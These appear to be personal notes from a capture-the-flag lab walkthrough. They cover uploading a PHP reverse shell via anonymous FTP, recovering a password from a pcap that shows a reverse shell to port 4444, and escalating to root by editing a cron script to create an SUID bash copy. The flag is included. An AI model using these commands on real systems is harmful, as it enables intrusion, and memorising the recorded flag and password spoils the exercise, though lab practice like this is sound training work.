21 vsftpd 3.0.3  
22 OpenSSH 7.2p2  
80 Apache/2.4.18
 
/files
 
Maya - from notice.txt
 
copy php rev shell to current directory  
anonymous login to ftp, put shell in ftp folder (can write)  
nc listener  
webshell: www-data
 
LinEnum:  
/usr/bin/crontab (SGID)  
/usr/bin/python3  
/bin/nc  
/bin/netcat  
/usr/bin/wget  
/usr/bin/curl
 
/incidents - pcap file, open in wireshark  
see a GET request for /shell.php  
right click>follow>http stream; see rev shell connection:  
WARNING: Failed to daemonise. This is quite common and not fatal.  
Successfully opened reverse shell to 192.168.22.139:4444  
look at traffic to/from this port  
tcp.port == 4444
 
export as plain text  
cat the file, find creds for lennie  
c4ntg3t3n0ughsp1c3
 
lennie@startup:~/scripts$ cat planner.sh  
#!/bin/bash  
echo $LIST > /home/lennie/scripts/startup_list.txt  
/etc/print.sh
 
nano print.sh (can write)  
cp /bin/bash /tmp/bash  
chmod +xs /tmp/bash (set SUID)
 
DON’T RUN THE PLANNER.SH BC IT WILL CREATE THE /TMP/BASH OWNED BY LENNIE AND WHEN ROOT GOES TO MAKE THE FILE IT WILL NOT BE ABLE TO OVERWRITE THE ONE OWNED BY LENNIE.
 
ussing pspy, you can see that root runs the planner.sh file every minute  
wait for planner.sh to run and make /tmp/bash SUID  
/tmp/bash -p
 
root  
THM{f963aaa6a430f210222158ae15c3d76d}
 
LL:  
Looking at attacker traffic in pcap/wireshark, then exporting at plaintext, cat, find passwd  
exploiting root cron job that executes a user-owned file; waiting for root to run the cron job.